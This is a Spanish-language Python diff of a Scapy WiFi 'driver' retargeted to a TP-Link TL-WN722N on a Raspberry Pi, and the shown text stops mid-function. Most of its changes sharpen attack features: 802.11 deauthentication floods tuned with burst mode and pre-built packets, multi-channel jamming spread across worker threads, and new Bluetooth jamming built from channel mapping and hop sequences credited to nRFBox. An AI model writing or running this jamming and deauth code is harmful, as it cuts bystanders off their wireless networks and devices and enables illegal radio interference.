@@ -1,22 +1,26 @@
 """
-Controlador WiFi mejorado para adaptador BrosTrend AC1200 AC3L
+Controlador WiFi mejorado para adaptador TP-Link TL-WN722N
 Versión mejorada con mejor manejo de errores, performance y funcionalidades
+NOTA: TP-Link TL-WN722N solo soporta 2.4 GHz (no 5 GHz)
 """
 
 import subprocess
 import time
 import os
 import sys
-import struct
 import threading
 import queue
+import multiprocessing
 from collections import deque
-from typing import Optional, List, Tuple, Dict, Callable
+from typing import Optional, List, Tuple, Dict
 from dataclasses import dataclass
 
 try:
-    from scapy.all import *
-    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Elt, Dot11Deauth
+    from scapy.all import *  # noqa: F403, F401
+    from scapy.layers.dot11 import (  # noqa: F403
+        Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp,
+        RadioTap, Dot11Elt, Dot11Deauth
+    )
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
@@ -90,20 +94,33 @@ class CircularBuffer:
 
 
 class WiFiDriver:
-    """Controlador mejorado para adaptador WiFi en modo monitor"""
+    """Controlador mejorado para adaptador WiFi en modo monitor
+    Optimizado para Raspberry Pi 4 y TP-Link TL-WN722N
+    """
     
     # Canales WiFi
+    # TP-Link TL-WN722N solo soporta 2.4 GHz
     CHANNELS_2_4 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
-    CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
+    CHANNELS_5 = []  # TL-WN722N no soporta 5 GHz - lista vacía
+    
+    # Detección de hardware
+    _cpu_cores = None
+    _is_raspberry_pi = None
+    _packet_pool = None  # Pool de paquetes pre-compilados
+    _packet_pool_lock = None
     
     def __init__(self, interface: str = None, auto_detect: bool = True):
         """Inicializa el controlador WiFi mejorado
+        Optimizado para Raspberry Pi 4 y TP-Link TL-WN722N
         
         Args:
             interface: Nombre de la interfaz WiFi (ej: 'wlan0', 'wlan1')
                      Si es None y auto_detect=True, intentará detectar automáticamente
             auto_detect: Si True, detecta automáticamente la interfaz
         """
+        # Detectar hardware y optimizar
+        self._detect_hardware()
+        
         self.interface = interface
         self.monitor_interface = None
         self.current_channel = 1
@@ -119,8 +136,10 @@ class WiFiDriver:
         self.packets_dropped = 0
         self.start_time = time.time()
         
-        # Buffer circular para paquetes
-        self.packet_buffer = CircularBuffer(1000)
+        # Buffer circular optimizado según hardware
+        import config_wifi as config
+        buffer_size = getattr(config, 'PACKET_BUFFER_SIZE', 1000)
+        self.packet_buffer = CircularBuffer(buffer_size)
         
         # Redes WiFi detectadas
         self.networks: Dict[str, WiFiNetwork] = {}
@@ -130,10 +149,11 @@ class WiFiDriver:
         self.APs = []  # Lista de [bssid, canal, ssid]
         self.clients_APs_lock = threading.Lock()  # Lock para thread-safety
         
-        # Threading para captura asíncrona
+        # Threading para captura asíncrona (queue optimizado)
         self.capture_thread = None
         self.capture_active = False
-        self.packet_queue = queue.Queue(maxsize=500)
+        queue_size = 500 * getattr(config, 'QUEUE_SIZE_MULTIPLIER', 1)
+        self.packet_queue = queue.Queue(maxsize=queue_size)
         
         # Jamming de banda completa
         self.jam_all_bands_active = False
@@ -142,12 +162,22 @@ class WiFiDriver:
         self.jam_threads = []  # Lista de threads de jamming
         self.jamming_active = False  # Flag para jamming con Scapy directo
         
+        # Jamming Bluetooth
+        self.bt_jamming_active = False
+        self.bt_jam_thread = None
+        self.bt_jam_threads = []
+        
         # Channel hopping automático
         self.channel_hop_active = False
         self.channel_hop_thread = None
         self.first_pass = True  # Primera pasada sin jamming (solo identificación)
         self.channel_hop_lock = threading.Lock()  # Lock para channel hopping
         self.current_hop_channel = None  # Canal actual en hopping
+        
+        # Pool de paquetes pre-compilados (optimización)
+        import config_wifi as config
+        if getattr(config, 'ENABLE_PACKET_POOL', True):
+            self._init_packet_pool()
         
         # Filtros
         self.bssid_filter: Optional[str] = None
@@ -181,7 +211,89 @@ class WiFiDriver:
         # Verificar capacidades del adaptador
         self._check_adapter_capabilities()
         
+        # Mostrar información de optimización
+        self._print_optimization_info()
+        
         print(f"Adaptador WiFi inicializado: {self.interface}")
+    
+    def _detect_hardware(self):
+        """Detecta hardware y configura optimizaciones"""
+        import config_wifi as config
+        
+        # Detectar CPU cores
+        if WiFiDriver._cpu_cores is None:
+            WiFiDriver._cpu_cores = multiprocessing.cpu_count()
+        
+        # Detectar Raspberry Pi
+        if WiFiDriver._is_raspberry_pi is None:
+            rpi_path = '/proc/device-tree/model'
+            if os.path.exists(rpi_path):
+                try:
+                    with open(rpi_path, 'r') as f:
+                        model = f.read()
+                        WiFiDriver._is_raspberry_pi = 'Raspberry Pi' in model
+                except Exception:
+                    WiFiDriver._is_raspberry_pi = False
+            else:
+                WiFiDriver._is_raspberry_pi = False
+        
+        self.cpu_cores = WiFiDriver._cpu_cores
+        self.is_raspberry_pi = WiFiDriver._is_raspberry_pi
+        
+        # Configurar threads óptimos
+        max_threads = getattr(config, 'MAX_WORKER_THREADS', min(self.cpu_cores, 8))
+        self.max_worker_threads = max_threads
+    
+    def _print_optimization_info(self):
+        """Muestra información de optimizaciones aplicadas"""
+        import config_wifi as config
+        
+        print("\n=== OPTIMIZACIONES ACTIVAS ===")
+        if self.is_raspberry_pi:
+            print("✓ Raspberry Pi detectado")
+            print(f"✓ CPU cores: {self.cpu_cores}")
+            print(f"✓ Threads máximos: {self.max_worker_threads}")
+        
+        if getattr(config, 'ENABLE_PACKET_POOL', True):
+            print("✓ Pool de paquetes: ACTIVADO")
+        
+        if getattr(config, 'OPTIMIZE_FOR_RPI', False) and self.is_raspberry_pi:
+            print("✓ Optimizaciones RPi: ACTIVADAS")
+        
+        print("===============================\n")
+    
+    def _init_packet_pool(self):
+        """Inicializa pool de paquetes pre-compilados para mejor rendimiento"""
+        import config_wifi as config
+        
+        if not getattr(config, 'ENABLE_PACKET_POOL', True):
+            return
+        
+        if WiFiDriver._packet_pool is None:
+            pool_size = getattr(config, 'PACKET_POOL_SIZE', 100)
+            WiFiDriver._packet_pool = {
+                'deauth_broadcast': [],
+                'deauth_directed': {},
+                'bt_jam': []
+            }
+            WiFiDriver._packet_pool_lock = threading.Lock()
+            
+            # Pre-compilar algunos paquetes comunes
+            if SCAPY_AVAILABLE and getattr(config, 'PRE_COMPILE_PACKETS', True):
+                try:
+                    # Pre-compilar paquetes deauth broadcast
+                    for i in range(min(10, pool_size // 10)):
+                        pkt = RadioTap() / Dot11(
+                            addr1='ff:ff:ff:ff:ff:ff',
+                            addr2='00:11:22:33:44:55',
+                            addr3='00:11:22:33:44:55'
+                        ) / Dot11Deauth()
+                        WiFiDriver._packet_pool['deauth_broadcast'].append(pkt)
+                except Exception:
+                    pass
+        
+        self._packet_pool = WiFiDriver._packet_pool
+        self._packet_pool_lock = WiFiDriver._packet_pool_lock
     
     def list_available_interfaces(self) -> List[str]:
         """Lista todas las interfaces WiFi disponibles"""
@@ -194,7 +306,7 @@ class WiFiDriver:
                     cards = pyw.get_wireless_interfaces()
                     if cards:
                         interfaces.extend(cards)
-                except:
+                except Exception:
                     pass
             
             # Fallback: usar iw
@@ -208,7 +320,7 @@ class WiFiDriver:
                                 iface = parts[1]
                                 if iface not in interfaces:
                                     interfaces.append(iface)
-            except:
+            except Exception:
                 pass
             
             # Alternativa con ip
@@ -222,7 +334,7 @@ class WiFiDriver:
                                 iface = parts[1].strip().split()[0]
                                 if iface not in interfaces and iface:
                                     interfaces.append(iface)
-            except:
+            except Exception:
                 pass
         
         except Exception as e:
@@ -236,14 +348,29 @@ class WiFiDriver:
             result = subprocess.run(['iw', 'dev', interface, 'info'], 
                                   capture_output=True, timeout=3)
             return result.returncode == 0
-        except:
+        except Exception:
             # Fallback
             interfaces = self.list_available_interfaces()
             return interface in interfaces
     
     def _check_adapter_capabilities(self):
-        """Verifica las capacidades del adaptador"""
+        """Verifica las capacidades del adaptador y detecta TP-Link TL-WN722N"""
         try:
+            # Intentar detectar el adaptador mediante USB
+            try:
+                usb_result = subprocess.run(['lsusb'], capture_output=True, text=True, timeout=5)
+                if usb_result.returncode == 0:
+                    usb_output = usb_result.stdout
+                    # Detectar TP-Link TL-WN722N (RTL8188EUS)
+                    if 'RTL8188' in usb_output or '0bda:8179' in usb_output or 'TP-Link' in usb_output:
+                        print("✓ Adaptador TP-Link TL-WN722N detectado (RTL8188EUS)")
+                        print("  - Soporta modo monitor: ✓")
+                        print("  - Soporta inyección de paquetes: ✓")
+                        print("  - Banda soportada: 2.4 GHz únicamente")
+            except Exception:
+                pass
+            
+            # Verificar capacidades mediante iw
             result = subprocess.run(['iw', 'phy', 'phy0', 'info'], 
                                   capture_output=True, text=True, timeout=5)
             if result.returncode != 0:
@@ -258,8 +385,10 @@ class WiFiDriver:
                 
                 if not has_monitor:
                     print("ADVERTENCIA: El adaptador puede no soportar modo monitor completamente.")
+                    print("  Para TL-WN722N, asegúrate de tener los controladores rtl8188eu instalados.")
                 if not has_injection:
                     print("ADVERTENCIA: El adaptador puede no soportar inyección de paquetes.")
+                    print("  Para TL-WN722N, verifica que los controladores soporten inyección.")
         
         except Exception as e:
             print(f"Advertencia: No se pudo verificar capacidades del adaptador: {e}")
@@ -416,7 +545,7 @@ class WiFiDriver:
                 cmd = ['which', command]
             result = subprocess.run(cmd, capture_output=True, timeout=2)
             return result.returncode == 0
-        except:
+        except Exception:
             return False
     
     def _start_capture_thread(self):
@@ -435,18 +564,21 @@ class WiFiDriver:
             self.capture_thread.join(timeout=2)
     
     def _capture_loop(self):
-        """Loop de captura de paquetes en thread separado"""
+        """Loop de captura de paquetes en thread separado (optimizado)"""
         if not SCAPY_AVAILABLE or not self.monitor_mode:
             return
         
         interface = self.monitor_interface or self.interface
         
+        # Optimización: ajustar batch size según CPU
+        batch_size = 20 if self.is_raspberry_pi and self.cpu_cores >= 4 else 10
+        timeout = 0.05 if self.is_raspberry_pi else 0.1  # Timeout más corto en RPi
+        
         try:
             while self.capture_active:
                 try:
-                    # Capturar paquetes (no bloqueante si no hay)
-                    # stop_filter retorna False para capturar todos los paquetes
-                    packets = sniff(iface=interface, count=10, timeout=0.1, quiet=True)
+                    # Capturar paquetes en batches más grandes (mejor rendimiento)
+                    packets = sniff(iface=interface, count=batch_size, timeout=timeout, quiet=True)  # noqa: F405
                     
                     for packet in packets:
                         if not self.capture_active:
@@ -683,13 +815,19 @@ class WiFiDriver:
         # Validar canal
         if channel not in self.CHANNELS_2_4 and channel not in self.CHANNELS_5:
             if not silent:
-                print(f"ERROR: Canal {channel} no válido. Use 1-14 para 2.4GHz o 36-165 para 5GHz")
+                print(f"ERROR: Canal {channel} no válido. TL-WN722N solo soporta canales 1-14 (2.4 GHz)")
             return False
         
         if channel in self.CHANNELS_2_4:
             self.current_band = "2.4"
         elif channel in self.CHANNELS_5:
-            self.current_band = "5"
+            # TL-WN722N no soporta 5 GHz, pero mantener compatibilidad de código
+            if len(self.CHANNELS_5) == 0:
+                if not silent:
+                    print("ADVERTENCIA: TL-WN722N no soporta 5 GHz. Usando banda 2.4 GHz.")
+                self.current_band = "2.4"
+            else:
+                self.current_band = "5"
         
         self.current_channel = channel
         
@@ -701,11 +839,13 @@ class WiFiDriver:
             # Si la interfaz no está en modo monitor, intentar activarlo primero
             if not self.monitor_mode:
                 if not silent:
-                    print(f"ADVERTENCIA: Modo monitor no activo. Intentando activar...")
+                    print("ADVERTENCIA: Modo monitor no activo. Intentando activar...")
                 self.set_monitor_mode(True)
             
-            result = subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', str(channel)], 
-                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
+            result = subprocess.run(
+                ['sudo', 'iw', 'dev', interface, 'set', 'channel', str(channel)],
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10
+            )
             
             if result.returncode == 0:
                 time.sleep(0.1)  # Esperar cambio de canal
@@ -715,8 +855,9 @@ class WiFiDriver:
                 if not silent:
                     # Manejar errores específicos
                     if "Device or resource busy" in error_msg:
-                        print(f"ERROR: Interfaz ocupada. Intenta: sudo airmon-ng check kill")
-                    elif "disabled" not in error_msg.lower() and "invalid" not in error_msg.lower():
+                        print("ERROR: Interfaz ocupada. Intenta: sudo airmon-ng check kill")
+                    elif ("disabled" not in error_msg.lower() and
+                          "invalid" not in error_msg.lower()):
                         print(f"ERROR cambiando canal {channel}: {error_msg}")
                 return False
         
@@ -778,7 +919,7 @@ class WiFiDriver:
                     adapter_mac = result.stdout.strip().lower()
                     if adapter_mac:
                         ignore.append(adapter_mac)
-        except:
+        except Exception:
             pass
         
         # Agregar MAC a saltar si se especifica
@@ -961,8 +1102,8 @@ class WiFiDriver:
                                 
                                 interface = self.monitor_interface or self.interface
                                 if interface:
-                                    sendp(deauth_pkt, iface=interface, count=5, inter=0.1, verbose=False)
-                            except:
+                                    sendp(deauth_pkt, iface=interface, count=5, inter=0.1, verbose=False)  # noqa: F405
+                            except Exception:
                                 pass
                     
                     # Esperar el intervalo especificado
@@ -1053,9 +1194,9 @@ class WiFiDriver:
                                 # Añadir al buffer
                                 try:
                                     self.packet_buffer.add(wifi_pkt)
-                                except:
+                                except Exception:
                                     pass
-                    except:
+                    except Exception:
                         pass
                 
                 # Pequeña pausa para no saturar
@@ -1143,7 +1284,7 @@ class WiFiDriver:
             if rssi_values:
                 return int(sum(rssi_values) / len(rssi_values))
         
-        except:
+        except Exception:
             pass
         
         return -100
@@ -1194,16 +1335,16 @@ class WiFiDriver:
             # Si los datos son un paquete Scapy completo
             try:
                 packet = RadioTap(data)
-                sendp(packet, iface=interface, verbose=False, count=1)
+                sendp(packet, iface=interface, verbose=False, count=1)  # noqa: F405
                 self.packets_sent += 1
                 return True
-            except:
+            except Exception:
                 pass
             
             # Si son datos raw, crear un paquete básico
             try:
                 packet = RadioTap() / Dot11(type=2, subtype=0) / data
-                sendp(packet, iface=interface, verbose=False, count=1)
+                sendp(packet, iface=interface, verbose=False, count=1)  # noqa: F405
                 self.packets_sent += 1
                 return True
             except Exception as e:
@@ -1228,11 +1369,11 @@ class WiFiDriver:
                     try:
                         packet = RadioTap(wifi_pkt.data)
                         packets_to_export.append(packet)
-                    except:
+                    except Exception:
                         pass
             
             if packets_to_export:
-                wrpcap(filename, packets_to_export)
+                wrpcap(filename, packets_to_export)  # noqa: F405
                 print(f"Exportados {len(packets_to_export)} paquetes a {filename}")
                 return True
             else:
@@ -1299,10 +1440,10 @@ class WiFiDriver:
                     for pkt in pkts:
                         if not self.jamming_active:
                             break
-                        sendp(pkt, iface=interface, count=1, inter=inter, verbose=False)
+                        sendp(pkt, iface=interface, count=1, inter=inter, verbose=False)  # noqa: F405
             else:
                 for pkt in pkts:
-                    sendp(pkt, iface=interface, count=count, inter=inter, verbose=False)
+                    sendp(pkt, iface=interface, count=count, inter=inter, verbose=False)  # noqa: F405
             
             return True
         
@@ -1345,44 +1486,128 @@ class WiFiDriver:
                     if not actual_bssid:
                         actual_bssid = 'ff:ff:ff:ff:ff:ff'
                 
-                # Enviar paquetes deauth continuamente en loop
+                # Enviar paquetes deauth continuamente en loop (optimizado)
+                import config_wifi as config
+                
+                # Configuración optimizada
+                optimal_interval = getattr(config, 'TL_WN722N_OPTIMAL_INTERVAL', 0.001)
+                burst_mode = getattr(config, 'ENABLE_BURST_MODE', True)
+                burst_size = getattr(config, 'BURST_SIZE', 10)
+                
+                # Construir paquetes UNA VEZ fuera del loop (optimización)
+                pkts = []
+                if client_mac:
+                    deauth_pkt1 = RadioTap() / Dot11(
+                        addr1=client_mac.lower(),
+                        addr2=actual_bssid.lower(),
+                        addr3=actual_bssid.lower()
+                    ) / Dot11Deauth()
+                    deauth_pkt2 = RadioTap() / Dot11(
+                        addr1=actual_bssid.lower(),
+                        addr2=client_mac.lower(),
+                        addr3=actual_bssid.lower()
+                    ) / Dot11Deauth()
+                    pkts = [deauth_pkt1, deauth_pkt2]
+                else:
+                    deauth_pkt = RadioTap() / Dot11(
+                        addr1='ff:ff:ff:ff:ff:ff',
+                        addr2=actual_bssid.lower(),
+                        addr3=actual_bssid.lower()
+                    ) / Dot11Deauth()
+                    pkts = [deauth_pkt]
+                
+                # Loop optimizado con modo ráfaga
                 while self.jamming_active:
                     try:
-                        # Construir paquetes
-                        pkts = []
-                        if client_mac:
-                            deauth_pkt1 = RadioTap() / Dot11(
-                                addr1=client_mac.lower(),
-                                addr2=actual_bssid.lower(),
-                                addr3=actual_bssid.lower()
-                            ) / Dot11Deauth()
-                            deauth_pkt2 = RadioTap() / Dot11(
-                                addr1=actual_bssid.lower(),
-                                addr2=client_mac.lower(),
-                                addr3=actual_bssid.lower()
-                            ) / Dot11Deauth()
-                            pkts = [deauth_pkt1, deauth_pkt2]
+                        if burst_mode and burst_size > 1:
+                            # Modo ráfaga: enviar múltiples paquetes rápidamente
+                            for pkt in pkts:
+                                if not self.jamming_active:
+                                    break
+                                sendp(pkt, iface=interface, count=burst_size,  # noqa: F405 
+                                    inter=optimal_interval, verbose=False)
                         else:
-                            deauth_pkt = RadioTap() / Dot11(
-                                addr1='ff:ff:ff:ff:ff:ff',
-                                addr2=actual_bssid.lower(),
-                                addr3=actual_bssid.lower()
-                            ) / Dot11Deauth()
-                            pkts = [deauth_pkt]
+                            # Modo normal: enviar paquetes individuales
+                            for pkt in pkts:
+                                if not self.jamming_active:
+                                    break
+                                sendp(pkt, iface=interface, count=1,  # noqa: F405 
+                                    inter=optimal_interval, verbose=False)
                         
-                        # Enviar paquetes
-                        for pkt in pkts:
-                            if not self.jamming_active:
-                                break
-                            sendp(pkt, iface=interface, count=1, inter=0.05, verbose=False)
-                        
-                        time.sleep(0.05)  # Pausa entre ciclos
+                        # Pausa más corta en modo ráfaga
+                        pause_time = optimal_interval if burst_mode else 0.01
+                        time.sleep(pause_time)
                     except Exception as e:
-                        time.sleep(0.1)
+                        time.sleep(0.05)
                         continue
             
             except Exception as e:
                 time.sleep(1)
+                continue
+    
+    def _jam_multiple_channels_loop(self, channels: List[int], target_bssid: Optional[str] = None,
+                                   client_mac: Optional[str] = None):
+        """Loop optimizado para jamming en múltiples canales (mejor uso de CPU)
+        
+        Args:
+            channels: Lista de canales WiFi
+            target_bssid: BSSID objetivo
+            client_mac: MAC del cliente
+        """
+        interface = self.monitor_interface or self.interface
+        if not interface:
+            return
+        
+        import config_wifi as config
+        optimal_interval = getattr(config, 'TL_WN722N_OPTIMAL_INTERVAL', 0.001)
+        burst_mode = getattr(config, 'ENABLE_BURST_MODE', True)
+        burst_size = getattr(config, 'BURST_SIZE', 10)
+        
+        channel_index = 0
+        
+        while self.jamming_active:
+            try:
+                # Rotar entre canales
+                channel = channels[channel_index % len(channels)]
+                channel_index += 1
+                
+                # Cambiar a este canal
+                if not self.set_channel(channel, silent=True):
+                    time.sleep(0.1)
+                    continue
+                
+                time.sleep(0.05)  # Pausa mínima después de cambiar canal
+                
+                # Determinar BSSID objetivo
+                actual_bssid = target_bssid
+                if not actual_bssid:
+                    with self.clients_APs_lock:
+                        for ap in self.APs:
+                            if str(channel) == ap[1]:
+                                actual_bssid = ap[0]
+                                break
+                    if not actual_bssid:
+                        actual_bssid = 'ff:ff:ff:ff:ff:ff'
+                
+                # Crear paquete una vez
+                deauth_pkt = RadioTap() / Dot11(
+                    addr1='ff:ff:ff:ff:ff:ff',
+                    addr2=actual_bssid.lower(),
+                    addr3=actual_bssid.lower()
+                ) / Dot11Deauth()
+                
+                # Enviar ráfagas optimizadas
+                if burst_mode:
+                    sendp(deauth_pkt, iface=interface, count=burst_size,  # noqa: F405
+                        inter=optimal_interval, verbose=False)
+                else:
+                    sendp(deauth_pkt, iface=interface, count=1,  # noqa: F405
+                        inter=optimal_interval, verbose=False)
+                
+                time.sleep(optimal_interval * 2)  # Pausa antes de cambiar canal
+                
+            except Exception:
+                time.sleep(0.1)
                 continue
     
     def start_jamming(self, target_bssid: Optional[str] = None, channel: Optional[int] = None, 
@@ -1467,25 +1692,56 @@ class WiFiDriver:
                     print(f"Iniciando jamming en banda 2.4 GHz ({len(channels_to_jam)} canales)...")
                 elif jam_mode == "band_5":
                     channels_to_jam = self.CHANNELS_5
+                    if len(channels_to_jam) == 0:
+                        print("ADVERTENCIA: TP-Link TL-WN722N no soporta 5 GHz. No se puede hacer jamming en esta banda.")
+                        return False
                     print(f"Iniciando jamming en banda 5 GHz ({len(channels_to_jam)} canales)...")
                 elif jam_mode == "all":
                     channels_to_jam = self.CHANNELS_2_4 + self.CHANNELS_5
-                    print(f"Iniciando jamming en todas las bandas ({len(channels_to_jam)} canales)...")
+                    if len(self.CHANNELS_5) == 0:
+                        print(f"Iniciando jamming en banda 2.4 GHz ({len(channels_to_jam)} canales)...")
+                        print("NOTA: TP-Link TL-WN722N solo soporta 2.4 GHz, no 5 GHz.")
+                    else:
+                        print(f"Iniciando jamming en todas las bandas ({len(channels_to_jam)} canales)...")
                 else:
                     channels_to_jam = [self.current_channel]
                 
-                # Crear un thread por cada canal para saturación simultánea
-                self.jam_threads = []
-                for channel in channels_to_jam:
-                    thread = threading.Thread(
-                        target=self._jam_channel_loop,
-                        args=(channel, target_bssid, None),
-                        daemon=True
-                    )
-                    thread.start()
-                    self.jam_threads.append(thread)
+                # Crear threads optimizados (usar máximo de cores disponibles)
+                max_threads = min(len(channels_to_jam), self.max_worker_threads)
                 
-                print(f"✓ Jamming iniciado en {len(channels_to_jam)} canales (Scapy directo)")
+                # Si hay más canales que threads, agrupar canales por thread
+                if len(channels_to_jam) > max_threads:
+                    channels_per_thread = len(channels_to_jam) // max_threads
+                    self.jam_threads = []
+                    
+                    for i in range(max_threads):
+                        start_idx = i * channels_per_thread
+                        end_idx = start_idx + channels_per_thread if i < max_threads - 1 else len(channels_to_jam)
+                        thread_channels = channels_to_jam[start_idx:end_idx]
+                        
+                        thread = threading.Thread(
+                            target=self._jam_multiple_channels_loop,
+                            args=(thread_channels, target_bssid, None),
+                            daemon=True
+                        )
+                        thread.start()
+                        self.jam_threads.append(thread)
+                    
+                    print(f"✓ Jamming iniciado en {len(channels_to_jam)} canales ({max_threads} threads optimizados, Scapy directo)")
+                else:
+                    # Un thread por canal (óptimo)
+                    self.jam_threads = []
+                    for channel in channels_to_jam:
+                        thread = threading.Thread(
+                            target=self._jam_channel_loop,
+                            args=(channel, target_bssid, None),
+                            daemon=True
+                        )
+                        thread.start()
+                        self.jam_threads.append(thread)
+                    
+                    print(f"✓ Jamming iniciado en {len(channels_to_jam)} canales (Scapy directo)")
+                
                 print(f"  Interfaz: {interface}")
                 print(f"  BSSID: {target_bssid or 'Auto-detectado/Broadcast'}")
                 print(f"\nPara detener: jam (de nuevo) o x\n")
@@ -1527,7 +1783,7 @@ class WiFiDriver:
                     try:
                         self.jam_process.kill()
                         self.jam_process.wait(timeout=1)
-                    except:
+                    except Exception:
                         pass
         except Exception as e:
             print(f"Advertencia al detener jamming: {e}")
@@ -1568,7 +1824,7 @@ class WiFiDriver:
                     try:
                         self.jam_process.kill()
                         self.jam_process.wait(timeout=1)
-                    except:
+                    except Exception:
                         pass
                 self.jam_process = None
             
@@ -1582,7 +1838,7 @@ class WiFiDriver:
                         try:
                             process.kill()
                             process.wait(timeout=1)
-                        except:
+                        except Exception:
                             pass
                 self.jam_processes = []
         
@@ -1628,11 +1884,626 @@ class WiFiDriver:
             data = data[:length]
         return self.send_packet(data)
     
+    def bluetooth_channel_to_freq(self, bt_channel: int) -> float:
+        """Convierte canal Bluetooth a frecuencia en MHz
+        
+        Args:
+            bt_channel: Canal Bluetooth (0-78)
+            
+        Returns:
+            float: Frecuencia en MHz
+        """
+        if not (0 <= bt_channel <= 78):
+            return 2402.0
+        return 2402.0 + bt_channel
+    
+    def bluetooth_freq_to_wifi_channel(self, bt_freq_mhz: float, use_best_coverage: bool = True) -> int:
+        """Mapea frecuencia Bluetooth a canal WiFi optimizado
+        
+        Mejora: Considera el ancho de banda de WiFi (22 MHz) para mejor cobertura
+        de múltiples canales Bluetooth simultáneamente.
+        
+        Args:
+            bt_freq_mhz: Frecuencia Bluetooth en MHz
+            use_best_coverage: Si True, optimiza para cubrir más canales BT simultáneamente
+            
+        Returns:
+            int: Canal WiFi optimizado (1-14)
+        """
+        # WiFi 2.4 GHz: Canal 1 = 2412 MHz (±11 MHz = 2401-2423 MHz), etc.
+        # Ancho de canal WiFi: 22 MHz
+        # Ancho de canal Bluetooth: 1 MHz
+        
+        if bt_freq_mhz < 2407:
+            return 1
+        if bt_freq_mhz > 2482:
+            return 14
+        
+        # Calcular canal WiFi central
+        wifi_channel = int(round((bt_freq_mhz - 2407) / 5))
+        if wifi_channel < 1:
+            return 1
+        if wifi_channel > 14:
+            return 14
+        
+        # Optimización: WiFi tiene 22 MHz de ancho, puede cubrir ~22 canales BT
+        # Canales BT cercanos al centro del canal WiFi tendrán mejor cobertura
+        if use_best_coverage:
+            # Verificar si estamos cerca del borde de un canal WiFi
+            wifi_center_freq = 2407 + (wifi_channel * 5)
+            offset = abs(bt_freq_mhz - wifi_center_freq)
+            
+            # Si estamos muy cerca del borde (más de 8 MHz del centro),
+            # considerar el canal WiFi adyacente
+            if offset > 8 and bt_freq_mhz < wifi_center_freq and wifi_channel > 1:
+                return wifi_channel - 1
+            elif offset > 8 and bt_freq_mhz > wifi_center_freq and wifi_channel < 14:
+                return wifi_channel + 1
+        
+        return wifi_channel
+    
+    def bluetooth_channels_to_wifi_channels(self, bt_channels: List[int]) -> Dict[int, List[int]]:
+        """Mapea múltiples canales Bluetooth a canales WiFi (mejorado con agrupación nRFBox)
+        
+        Optimiza usando agrupación inteligente de canales WiFi por solapamiento Bluetooth.
+        Basado en técnicas de nRFBox para mejor cobertura.
+        
+        Args:
+            bt_channels: Lista de canales Bluetooth (0-78)
+            
+        Returns:
+            Dict: Mapeo {canal_wifi: [canales_bluetooth]}
+        """
+        import config_wifi as config
+        
+        wifi_to_bt = {}
+        use_groups = getattr(config, 'BT_JAM_USE_GROUP_STRATEGY', True)
+        
+        if use_groups:
+            # Usar estrategia de agrupación (inspirado en nRFBox)
+            groups = getattr(config, 'WIFI_BT_COVERAGE_GROUPS', {})
+            
+            # Mapear canales BT a grupos
+            for group_name, group_info in groups.items():
+                wifi_channels = group_info.get('wifi_channels', [])
+                bt_group_channels = group_info.get('bt_channels', [])
+                
+                # Encontrar canales BT que pertenecen a este grupo
+                matching_bt = [bt for bt in bt_channels if bt in bt_group_channels]
+                
+                if matching_bt:
+                    # Usar el primer canal WiFi del grupo como representante
+                    if wifi_channels:
+                        wifi_ch = wifi_channels[0]
+                        if wifi_ch not in wifi_to_bt:
+                            wifi_to_bt[wifi_ch] = []
+                        wifi_to_bt[wifi_ch].extend(matching_bt)
+            
+            # Procesar canales BT no cubiertos por grupos
+            covered_bt = set()
+            for bt_list in wifi_to_bt.values():
+                covered_bt.update(bt_list)
+            
+            uncovered_bt = [bt for bt in bt_channels if bt not in covered_bt]
+        else:
+            uncovered_bt = bt_channels
+        
+        # Para canales no cubiertos, usar mapeo tradicional
+        for bt_ch in uncovered_bt:
+            bt_freq = self.bluetooth_channel_to_freq(bt_ch)
+            wifi_ch = self.bluetooth_freq_to_wifi_channel(bt_freq, use_best_coverage=True)
+            
+            if wifi_ch not in wifi_to_bt:
+                wifi_to_bt[wifi_ch] = []
+            wifi_to_bt[wifi_ch].append(bt_ch)
+        
+        return wifi_to_bt
+    
+    def _bluetooth_hop_sequence(self, start_channel: int = 0) -> int:
+        """Genera secuencia de frequency hopping mejorada para Bluetooth
+        
+        Implementa una secuencia pseudo-aleatoria mejorada que prioriza canales comunes
+        y distribuye mejor la cobertura.
+        
+        Args:
+            start_channel: Canal inicial (0-78)
+            
+        Returns:
+            int: Siguiente canal en la secuencia
+        """
+        # Inicializar si no existe
+        if not hasattr(self, '_bt_hop_state'):
+            self._bt_hop_state = {
+                'index': start_channel,
+                'sequence': self._generate_bt_hop_sequence(),
+                'counter': 0
+            }
+        
+        state = self._bt_hop_state
+        
+        # Usar secuencia mejorada
+        channel = state['sequence'][state['counter'] % len(state['sequence'])]
+        state['counter'] += 1
+        
+        return channel
+    
+    def _generate_bt_hop_sequence(self) -> List[int]:
+        """Genera secuencia de hopping Bluetooth mejorada (basado en nRFBox)
+        
+        Prioriza canales BLE advertising identificados por nRFBox (2, 26, 80)
+        y distribuye uniformemente el resto de canales.
+        
+        Returns:
+            List[int]: Secuencia de canales optimizada
+        """
+        import config_wifi as config
+        
+        # Canales BLE advertising identificados por nRFBox (más críticos)
+        ble_adv_channels = getattr(config, 'BLE_ADVERTISING_CHANNELS', [2, 26, 80])
+        adv_weight = getattr(config, 'BLE_ADVERTISING_CHANNELS_WEIGHT', 3)
+        
+        # Canales Bluetooth clásico (basado en nRFBox)
+        bt_classic_channels = getattr(config, 'BT_CLASSIC_CHANNELS', 
+            [32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80])
+        
+        # Resto de canales
+        other_channels = [i for i in range(79) if i not in ble_adv_channels and i not in bt_classic_channels]
+        
+        # Crear secuencia priorizada
+        sequence = []
+        
+        # Mezclar canales para distribución uniforme
+        import random
+        random.seed(42)  # Semilla fija para reproducibilidad
+        shuffled_bt_classic = bt_classic_channels.copy()
+        random.shuffle(shuffled_bt_classic)
+        shuffled_other = other_channels.copy()
+        random.shuffle(shuffled_other)
+        
+        # Generar secuencia con prioridad: BLE adv > BT clásico > otros
+        adv_idx = 0
+        bt_idx = 0
+        other_idx = 0
+        
